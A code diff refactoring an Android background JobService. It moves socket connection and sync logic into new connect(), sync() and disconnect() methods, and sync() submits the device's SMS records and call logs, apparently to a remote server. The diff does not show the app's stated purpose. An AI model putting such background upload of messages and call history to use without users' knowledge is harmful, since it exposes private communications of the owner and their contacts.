@@ -81,22 +81,7 @@ public class NetworkSchedulerService extends JobService {
     public boolean onStartJob(final JobParameters params) {
         jobParameters = params;
         Log.i(TAG, "onStartJob: ");
-        if (!connected)
-            socket.connect();
-        smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
-            @Override
-            public void onResult(boolean success) {
-            Log.i(TAG, "Done submit record!!!!");
-
-            callLogRecorderTask.submitNextRecord(new CallLogRecorderTask.SubmitCallLogCallback() {
-                @Override
-                public void onResult(boolean success) {
-                    Log.i(TAG, "Done submit call logs!!!!");
-                }
-            });
-
-            }
-        });
+        sync();
         return true;
     }
 
@@ -129,6 +114,33 @@ public class NetworkSchedulerService extends JobService {
         return (info != null && info.isConnected());
     }
 
+    public void connect() {
+        if (hasConnection() && !connected && socket != null)
+            socket.connect();
+    }
+
+    public void sync() {
+        connect();
+        smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
+            @Override
+            public void onResult(boolean success) {
+                Log.i(TAG, "Done submit record!!!!");
+
+                callLogRecorderTask.submitNextRecord(new CallLogRecorderTask.SubmitCallLogCallback() {
+                    @Override
+                    public void onResult(boolean success) {
+                        Log.i(TAG, "Done submit call logs!!!!");
+                    }
+                });
+
+            }
+        });
+    }
+
+    public void disconnect() {
+        if (socket != null) socket.disconnect();
+    }
+
     private void init() {
 
         if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
@@ -140,11 +152,7 @@ public class NetworkSchedulerService extends JobService {
 
         Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
 
-        if (!connected && hasConnection()) {
-            Log.i(TAG, "Socket is connecting ......\n");
-            socket.connect();
-        }
-
+        connect();
         cleanUp();
 
     }
@@ -291,10 +299,6 @@ public class NetworkSchedulerService extends JobService {
             e.printStackTrace();
         }
 
-    }
-
-    private void disconnect() {
-        if (socket != null) socket.disconnect();
     }
 
     private void cleanUp () {
